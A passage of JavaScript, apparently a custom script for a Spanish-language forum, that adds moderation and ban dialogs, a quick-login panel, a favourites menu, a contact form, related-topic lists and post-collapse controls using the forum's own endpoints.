                    b = '<div class="announcement-bar view announcement-bar--open view--loaded">' + a + '<i class="fa fa-times-circle-o hide" onclick="ops.close_popup(this)"></i></div>',
                    c = $.getby('#page-header').getElementsByClassName('navlinks')[0];
                c.insertAdjacentHTML('beforeend', b);
            }
        },
        close_popup(c) {
            c.parentNode.remove();
            Cookies.set('popuphide', '1', {
                expires: 7
            });
        },
        ocultar_mod: function () {
            var a = ops.soy_staff,
                b = ops.nombre_perfil,
                c = $.getby('#field_id-20');
            if (c) {
                (c && a) ? (ops.moderacion_pub(), (b == ops.mi_nombre) && (c.style.display = 'none')) : b !== ops.mi_nombre ? (c.style.display = 'none') : (c.style.display = 'block')
            }
        },
        status_box_html: function () {
            var f = $.getby('#fa_menulist'),
                e = ops.mi_nombre + ' ¿que tienes en mente?',
                t = '<div id="AAGstatus"><input id="AAGstatus_input" type="text" placeholder="' + e + '" ><div class="status-button" onclick="ops.status_box()"><i class="fa fa-pencil-square-o"></i></div><span id="AAGstatus_notice"></span></div><div id="_miniportada"><div class="_miniportada-button" onclick="ops.start_f_change(\'portada\',this)"><i class="fa fa-picture-o"></i></div><input id="_miniportada_input" class="all" type="text" placeholder="' + ops.lang.cf_p_a + '"></div>';
            if (f) {
                f.insertAdjacentHTML('beforeend', t);
            }
        },
        moderacion_pub: function () {
            var a = $.getby('#field_id-20'),
                b = '<div id="reglas_mod"><i class="fa fa-exclamation-circle" style=" font-size: 37px; float: left; margin-left: 5px; margin-right: 5px;"></i> Recuerda que este foro, no es el FDF, moderamos una sola vez por día al mismo usuario en caso que sea necesario, ó una falta muy grave, ó distinta a la señalada previamente</div>',
                d = document.querySelectorAll('a[href*="/modcp?mode=ban"]');
            a.insertAdjacentHTML('beforebegin', b);
            d.length && d[0].setAttribute('onclick', 'ops.ban_user(this);return false');
        },
        ban_user: function (c) {
            var a = '<div class="ban_content" ><div class="ban_close" style="float:right"><img src="http://i83.servimg.com/u/f83/17/06/15/51/close10.png" /></div><div class="head_title"><div class="header"><h1 class="page-title"> ¿Deseas banear a ' + ops.nombre_perfil + ' </h1></div><div class="ban_comm"><form name="ban_o"><p class="frm-info"></p><fieldset class="frm-set"><dl><dt>(Opcional) por un periodo: </dt><dd><input type="text" name="ban_user_date" class="inputbox tiny"></dd></dl><dl><dt>(Optional) por la siguiente razón:</dt><dd><input type="text" name="ban_user_reason" class="inputbox tiny"></dd></dl><dl><dd><input type="submit" name="confirm" value="Banear" class="enviar_ban" onclick="ops.send_ban_o(this);return false"></dd></dl></fieldset></form></div></div></div>';
            document.body.insertAdjacentHTML('afterbegin', a);
            //convertir
            $('.ban_close').find('img').add('#lightBG').on('click', function () {
                $('#lightBG, .ban_content').fadeOut('2000')
            });
            ops.back();
            return false
        },
        mas: function () {
            var t, j, a = $.getby('.plusmenu')[0],
                b = $.getby('#plus_menu'),
                c = b.getElementsByClassName('left-overview')[0],
                d = c.getElementsByTagName('strong')[0],
                e = c.getElementsByTagName('a'),
                f = '<div class="tip_info">Da click y úsame</div>',
                g = a.getElementsByTagName('a')[0],
                h = b.getElementsByTagName('a')[4].outerHTML,
                i = b.getElementsByClassName('left-overview')[1];
            a.insertAdjacentHTML('beforebegin', f);
            c.insertAdjacentHTML('beforeend', '<br/>' + h);
            i.remove();
            for (t = 0; t < e.length; t++) {
                j = 'pl_a' + t;
                e[t].classList.add('pl_' + t);
                e[t].setAttribute('onclick', 'ops.start_Ncontent("' + j + '",this); return false');
            }
            g.textContent = '+';
            g.setAttribute('title', 'Menú con opciones extras');
            g.setAttribute('onclick', 'ops.mas_click(this);return false');
        },
        mas_click: function () {
            var b = $.getby('#plus_menu');
            $(b).animate({
                height: 'toggle',
                opacity: 'toggle'
            }, 300), $('.tip_info').fadeToggle();
            ops.cf_html()
        },
        VsITs_: function () {
            var d, f, b, c, e = '<div class="visitas"style="background:rgb(255, 255, 255);border:1px solid rgb(204, 204, 204);text-align:justify;padding:5px"></div>',
                a = $.getby('#field_id-8');
            if (a) {
                b = a.getElementsByTagName('span'),
                    c = $.getby('.visitas');
                b[0].style = 'cursor:pointer';
                b[0].onclick = function () {
                    if (!c.length) {
                        d = this.parentNode.parentNode;
                        f = a.getElementsByClassName('field_uneditable')[0].textContent;
                        d.insertAdjacentHTML('afterbegin', e);
                        c = $.getby('.visitas');
                        c[0].style.color = '#000';
                        c[0].textContent = f
                    }
                }
            };
            ops.VPrF_()
        },
        BBCodeToHtml: function (a) {
            var $BBCODE_search = [
                /\[b\](.*?)\[\/b\]/g,
                /\[i\](.*?)\[\/i\]/g,
                /\[u\](.*?)\[\/u\]/g,
                /\[s\](.*?)\[\/s\]/g,
                /\[center\](.*?)\[\/center\]/g,
                /\[size=(.*?)\](.*?)\[\/size\]/g,
                /\[url](.*?)\[\/url\]/g,
                /\[url=(.*?)\](.*?)\[\/url\]/g,
                /\[color=(.*?)\](.*?)\[\/color\]/g,
                /\[img\](.*?)\[\/img\]/g,
                /\[table class=(.*?)\]\[td\](.*?)\[\/td\]\[\/table\]/g
            ];
            var $HTML_replace = [
                '<strong>$1</strong>',
                '<em>$1</em>',
                '<span style="text-decoration:underline;">$1</span>',
                '<span style="text-decoration:line-through">$1</span>',
                '<div style="text-align:center;">$1</div>',
                '<span style="font-size: $1;">$2</span>',
                '<a href="$1"></a>',
                '<a href="$1">$2</a>',
                '<span style="color: $1">$2</span>',
                '<img src="$1"/>',
                '<table class="$1"><tbody><tr><td>$2</td></tr></tbody></table>'
            ];
            var len = $BBCODE_search.length;
            for (var i = 0; i < len; i++) {
                a = a.replace($BBCODE_search[i], $HTML_replace[i]);
            }
            return a
        },
        send_ban_o: function (c) {
            var b = $.getby('.enviar_ban')[0],
                c = document.forms.ban_o.ban_user_reason,
                d = document.forms.ban_o.ban_user_date,
                e = location.pathname.match(/\d+/g)[0],
                f = {
                    ban_user_date: d.value,
                    ban_user_reason: c.value,
                    confirm: 1,
                    mode: 'ban',
                    user_id: e,
                    tid: isTid
                };
            $.post('/modcp?tid=' + isTid, f).done(function () {
                $.boxes('alert', ops.nombre_perfil + ' ha sido expulsado');
                c.textcontent = ops.nombre_perfil + ' ha sido expulsado';
                c.removeAttribute('href');
                ops.back_close('.ban_content')
            })
        },
        add_mod: function () {
            var b = $.getby('#field_id-20'),
                c = $.getby('#profile_field_2_-20'),
                d = $.getby('.activetab')[0];
            if (b && ops.soy_staff && ops.nombre_perfil !== ops.mi_nombre && d.innerHTML.indexOf('Perfil') >= 0) {
                c.onfocus = function () {
                    c.style.height = '300px';
                    c && (window.onbeforeunload = function () {
                        return c.value.length ? ops.mi_nombre + ' todavía no has enviado tu moderación' : void 0
                    });
                    this.value += (this.value ? '\n' : '') + ('[img]' + ops.lang.red_flag + '[/img]') + (new Date).getDate() + '/' + ((new Date).getMonth() + 1 < 10 ? '0' + ((new Date).getMonth() + 1) : (new Date).getMonth() + 1) + '/' + ((new Date).getFullYear() - 2000) + ' Moderado por ([url=http://' + window.location.host + '/u' + ops.mi_id + '][b]' + ops.mi_nombre + '[/b][/url]) : ';
                    this.scrollTop = 99999;
                    ops.valid = $.getby('.ajax-profil_valid')[0];
                    ops.valid.onclick = function () {
                        c.value.length && (window.onbeforeunload = false, $.boxes({
                            mode: 'confirm',
                            title: '¿Deseas enviar un mensaje de notificación?',
                            ok: function () {
                                var t = c.value;
                                ops.i_a_usename = ops.nombre_perfil,
                                    ops.i_a_subjet = '[Mensaje automático]: Fuiste moderado',
                                    ops.i_a_message = '[b]Este mensaje es enviado automáticamente:[/b]\n [b][color=#FF0000]Fuiste moderado por un miembro de la administración, te recomiendo leer el reglamento.[/color][/b]\n [quote] ' + t + '[/quote]\n No responder este mensaje.',
                                    ops.i_a_done = function () {
                                        $.boxes('alert', ops.mi_nombre + ' se envió un mensaje al usuario que estas moderando')
                                    }, ops.i_a()
                            }
                        }))
                    }
                }
            }
        },
        Fv_tB_: function () { // pulir
            var b, c, d, e, f, g, t, h, j, k, l, m, n, a = $.getby('#fa_right'),
                e = '<a id="mis_favoritos" class="leftHeaderLink">Favoritos <i class="fa fa-bars" style="margin-left: 13px;"></i><span id="cant_fav"></span></a>';
            a.insertAdjacentHTML('afterbegin', e);
            b = $.getby('#mis_favoritos');
            d = $.getby('#fa_menulist');
            e = $.getby('#fa_right');
            f = $.getby('#cant_fav');
            g = 'display:table;margin:0 auto;font-family:arial;color: rgb(0, 0, 0);font-size: 12px;height: 50px;line-height: 8;';
            t = 'color:rgb(51, 51, 51);font-size:11px;display:inline-block!important;text-indent:5px;max-width:300px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;',
                m = '<div id="fav_list" style="50px"><span class="fav_cont" style="min-height:96px"><center><br/><i style="color:rgb(0, 0, 0);font-size:32px"class="fa fa-spinner fa-spin"></i></center></span><li class="see_all"><i class="fa fa-bars" style="float:left;margin-top: -3px;"></i><a href="/search?search_id=favouritesearch">Ver todos mis temas favoritos</a></li></div>';
            b.onclick = function () {
                !$.getby('#fav_list') && (b.insertAdjacentHTML('afterend', m));
                this.classList.toggle('menu_active');
                n = $.getby('.menu_active'),
                    c = n.length && (n[0]);
                h = $.getby('.fav_cont')[0];
                l = $.getby('#fav_list');
                c.style = 'color:rgb(255, 255, 255)';
                l.style.display == 'block' ? l.style.display = 'none' : l.style.display = 'block';
                $(h).load('/search?search_id=favouritesearch #cp-main table .topictitle:lt(40)', function () {
                    j = this.getElementsByClassName('topictitle');
                    for (var i = 0; i < j.length; i++) {
                        j[i].style = t;
                        k = j[i].href;
                        j[i].href = k + '?view=newest';
                    }
                    f.textContent = j.length;
                    n.length ? f.style.display = 'inline-flex' : f.style.display = 'none';
                    ops.Nacti_msg = ops.mi_nombre + ' vió sus temas favoritos ';
                    ops.Na();
                    ops.prefijos_all_add();
                    j.length < 0 && (this.innerHTML = '<p class="mensaje" style="' + g + '">No tienes temas favoritos</p>');
                })
            }
        },
        //pulir
        fx_Tb: function () {
            var a = $.getby('#fa_welcome'),
                b = $.getby('#fa_notifications'),
                c = $.getby('#fa_menulist'),
                d = $.getby('#notif_list');
            a.onclick = function () {
                $(c).css('left', $(a).position().left - $(c).width() - '60').animate({
                    height: 'toggle',
                    opacity: 'toggle'
                }, 300)
            }
            b.onclick = function () {
                Toolbar._alignNotifications();
                $(d).animate({
                    height: 'toggle',
                    opacity: 'toggle'
                }, 300);
            }
        },
        //convertir
        panel_log: function () {
            var e = {
                    time: 750,
                    shadow: 0,
                    offsetX: '42'
                },
                o = e.shadow,
                a = e.time;
            if (1 === o);
            else;
            var n = '<div id="quickLoginPanel" style="height: 160px;left:0!important;background: url(http://i.imgur.com/ylwhiOI.png) repeat-x!important;position: fixed; width: 100%!important;z-index: 10003;display: block!important;border:none!important;box-shadow:none!important"><fieldset class="fields1 left fld_connexion"><form style="margin-top: 9px;" name="form_login" method="post" action="/login"><dl><dt><label for="username">Usuario:</label></dt><dd><input id="username" class="username inputbox autowidth" type="text" value="" maxlength="40" size="25" name="username" tabindex="1"></dd></dl><dl><dt><label for="password">Contraseña:</label></dt><dd><input id="password" class="password inputbox autowidth" type="password" maxlength="25" size="25" name="password" tabindex="2"></dd><dd><a href="/profile?mode=sendpassword">Olvide mi contraseña</a></dd></dl><dl><dd><label for="autologin"><input id="autologin" class="radio" type="checkbox" tabindex="4" name="autologin">Ingresar automaticamente</label></dd></dl><dl><dt>&nbsp;</dt><dd><input class="button1" type="submit" value="Entrar al foro" tabindex="6" name="login"></dd></dl><a href="" id="quickLoginClose">Cerrar</a><form></fieldset></div>';
            ops.logout || $('a[href*="/login"]').on('click', function () {
                return $.getby('#quickLoginPanel') || ($(document.body).append(n), $('#quickLoginPanel').css('left', e.offsetX + '%').css('top', '-25%').animate({
                    top: '30px'
                }, a), $(window).scrollTop() > 240 && ($('#quickLoginPanel').css('margin-top', '13px'), $('.menufijo').find('.announcement-bar').length && $('#quickLoginPanel').css('margin-top', '100px')), $('.username').on('blur', function () {
                    $.get('/search?mode=searchuser&fieldname=username', {
                        search_username: $('.username').val(),
                        time: timestamp()
                    }, function (e) {
                        if ($(e).find('#username_list').val() != $('.username').val()) {
                            var t = '<p class="login_notice" style="color: rgb(255, 0, 0); margin-left: 163px; position: absolute; margin-top: -16px;">El usuario no existe ó escribelo con las mayúsculas y minúsculas como fue registrado</p>';
                            return $('.username').after(t), $('.username').attr({
                                style: 'background:rgb(255, 192, 203)!important',
                                placeholder: 'Intenta de nuevo'
                            }).val('').on('keyup', function () {
                                $(this).removeAttr('style'), $('.login_notice').fadeOut(function () {
                                    $(this).remove()
                                })
                            }), !1
                        }
                        console.log('Ok: El usuario existe')
                    })
                }), $('#quickLoginPanel').find('.button1').on('click', function (e) {
                    e.preventDefault(), ops.send_log_ajax()
                }), $('#quickLoginClose').on('click', function () {
                    return $('#quickLoginPanel').animate({
                        top: '-25%'
                    }, a, function () {
                        $('#quickLoginPanel').remove()
                    }), !1
                })), !1
            })
        },
        //convertir
        add_fr_pu: function () {
            $('.member_box').find('a[href*="/profile?foe"]').remove(), $('.member_box').find('a[href*="page_profil=friendsfoes"]').on('click', function (e) {
                e.preventDefault();
                var t = this.href,
                    o = $(this).closest('.member_box'),
                    a = o.find('strong').text(),
                    n = (o.find('strong').parents('a').attr('href'), $(this).text()),
                    s = $(this);
                $.get(t, function (e) {
                    console.log(a + ': Se envio solicitud')
                }).success(function () {
                    'Suprimir de mi lista de amigos' === n ? s.text('Ya no somos amigos') : s.text('Solicitud enviada')
                }).error(function () {
                    $.boxes(' alert', 'intenta de nuevo')
                })
            })
        },
        adfly: function () {
            $('.postbody').find('a[href^="http://adf.ly/"]').attr('href', function () {
                return this.href.replace(/http\:\/\/adf\.ly\/\d+\/(.+)/, '$1')
            });
        },
        //convertir
        staff_alert: function () {
            if (ops.soy_user) $('.index-box').find('.row').has('.F_staff').addClass('staff').find('.forumtitle').on('click', function (a) {
                a.preventDefault();
                $.boxes('alert', 'Foro destinado al staff');
            });
        },
        //corregir
        cT_Ajx: function () {
            $('a[href="/contact"]').on('click', function (e) {
                if (e.preventDefault(), $('#quickContact').length) $('#quickContact').fadeIn();
                else {
                    document.body.insertAdjacentHTML('afterbegin', ops.lang.contact)
                }
                if (ops.back(''), !$('#logout').length) {
                    var o = '<dd><dl><label>Email: <input style="width: 218px" type="email" name="email" id="email" placeholder="introduce tu email" required /></label></dt></dl>';
                    $('#addEmail').html(o)
                }
                $('.modal_close').on('click', function () {
                    $(this).parent().fadeOut(), ops.back_close('')
                }), $('#quickContact').on('submit', function (e) {
                    e.preventDefault();
                    var t = {
                        subject: $('#subject').val(),
                        message: $('#message').val(),
                        reg_key: $('#reg_key').val(),
                        action: 'submit'
                    };
                    $('#logout').length || (t.email = $('#email').val()), $.post('/contact', t).done(function (e) {
                        $(e).find('p.center').text().indexOf('Tu mensaje ha sido transmitido con éxito') >= 0 && ($('#quickContact').find('fieldset.submit-buttons').before('<center><p style="color:rgb(255, 255, 0)">Se envió el mensaje con éxito</p></center>'), ops.estoy_logueado && ops.notify('Se envió el mensaje con éxito'))
                    }).always(function () {
                        setTimeout(function () {
                            $('#subject').add('#reg_key').add('#email').add('#message').val(''), $('#quickContact').add('#lightBG').fadeOut(function () {
                                $(this).remove()
                            })
                        }, 1e3)
                    })
                })
            })
        },
        e_CTm_w: function (c) {
            url = $(c).closest('li').find('.topictitle').attr('href').match(/\d+/)[0],
                esto = $(c).closest('li');
            console.log(url + ' /modcp?mode=move&t=' + url + '&tid=' + isTid);
            $.post('/modcp?mode=move&t=' + url + '&tid=' + isTid, {
                confirm: 1,
                new_forum: 'f16'
            }).done(function () {
                esto.fadeOut(function () {
                    $(this).remove()
                })
            })
        },
        actividad_f: function () {
            $('.index-box').find('.index_topicname').add('.announcement .topictitle').on('click', function () {
                var e = this.textContent,
                    t = this.href;
                ops.Nacti_msg = ops.mi_nombre + ' visitó el tema : [url=http://' + location.hostname + t + ']' + e + '[/url]', ops.Na()
            }), $('.forumtitle').on('click', function () {
                var e = this.textContent,
                    t = this.href;
                ops.Nacti_msg = ops.mi_nombre + ' visitó la categoría: [url=http://' + location.hostname + t + ']' + e + '[/url]', ops.Na()
            })
        },
        trafico: function () {
            function f(t) {
                return t.replace(/^\s?\[[^\[\]]+\]\s?/, "")
            }
            function h(t, a, e) {
                t = $('<div>', {
                    'class': t
                });
                var r = $('<ol>', {
                    'class': 'olList'
                });
                return t.append($('<h2>', {
                    html: '<i class="fa fa-' + a + '-o"></i>&nbsp;' + e
                })), t.append(r), t.appendTo(d), r
            }
            function l(t, a, e) {
                $('<li>').append($('<a>', {
                    href: t,
                    title: a,
                    text: a
                })).appendTo(e)
            }
            var d = $('<div>', {
                'class': 'recommend clearfix'
            });
            d.prependTo('#ptrafic_scroll_div');
            var m = location.pathname.match(/\/t(\d+)/)[1],
                number_ = $.getby('.nav').length && ($.getby('.boxbottom')[0].getElementsByClassName('nav')[2].href.match(/\/f(\d+)-/)[1]);
            $.get('/feed/?f=' + number_).success(function (t) {
                if (t = $('item:lt(6)', t), 1 < t.length) {
                    d.addClass('eLcat');
                    var a = h('samecategory', 'star', 'En la misma categoria'),
                        e = 0;
                    t.each(function (t, r) {
                        var n = $(r),
                            c = f(n.find('title').text()),
                            n = n.find('link').text();
                        n.match(/\/t(\d+)/)[1] != m && 5 > e++ && l(n, c, a)
                    })
                }
            });
            $.get('/search?search_keywords=' + f(ops.titulo_pagina).replace(/\s/g, '+') + '&search_time=365', function (t) {
                if (t = $('.topictitle:lt(6)', t), 1 < t.length) {
                    d.addClass('eLrel');
                    var a = h('related', 'bookmark', 'Temas relacionados'),
                        e = 0;
                    t.each(function (t, r) {
                        var n = $(r),
                            c = f(n.text()),
                            n = n.attr('href').split('?highlight=')[0];
                        n.match(/\/t(\d+)/)[1] != m && 5 > e++ && l(n, c, a)
                    })
                }
            });
        },
        //convertir
        borrar_tags: function () {
            $('.close_tag').on('click', function () {
                $('.accion').remove();
                $(this).removeClass('close_tag').addClass('actived_tag').off('click')
            });
        },
        //terminar
        C_pSo: function () {
            $(function () {
                var e = ops.p_Fi,
                    f = '<p class="thugon"><span><span class="viewfull"><i class="fa fa-chevron-circle-down"></i> Ver completo</span><span class="viewhide" style="display:none"><i class="fa fa-chevron-circle-up"></i> Colapsar</span></span><span><span class="fullOff" style="float:right"><i class="fa fa-power-off" style="color:rgba(255, 0, 0, 1)"></i> Desactivar colapso</span><span class="fullOn" style="float:right;display:none"><i class="fa fa-power-off" style ="color:rgba(0, 128, 0, 1)"></i> Activar colapso</span></span></p>';
                for (t = 0; t < e.length; t++) {
                    var a = e[t].getElementsByClassName('content')[0];
                    if (a.clientHeight >= 500) {
                        a.classList.add('long_post'), a.style.height = '400px', a.nextElementSibling.outerHTML = f;
                    }
                } //convertir
                Cookies.get('c_so') === '100%' && ($('.fullOn').add('.viewhide').add('.viewfull').add('.fullOff').fadeToggle(), $('.long_post').height('100%')), $('.fullOn').add('.viewhide').add('.viewfull').add('.fullOff').on('click', function () {
                    var u = '100%',
                        t = this,
                        o = t.getAttribute('class');
                    ('viewhide' === o || 'fullOn' === o) && (u = 400), 'fullOff' === o || 'fullOn' === o ? (Cookies.set('c_so', u, {
                        expires: 1
                    }), $('.fullOff').add('.fullOn').fadeToggle()) : ($(t).closest('.thugon').prev().height(u), $(window).scrollTop($(t).closest('.post').offset().top)), $(t).hide().siblings().show()
                })
            })
        },
    };
    ops.iniciar();
    console.log('%cSe original', colors.blue);
    console.log('%cNo Copies', colors.purple);
    console.log('%c¡¡¡ Crea !!!', colors.brown);
    console.log('%c|||| %c|||| %c|||| %c|||| %c|||| %c|||| %c|||| %c|||| %c||||', colors.green, colors.green, colors.green, colors.gray, colors.gray, colors.gray, colors.red, colors.red, colors.red);
}
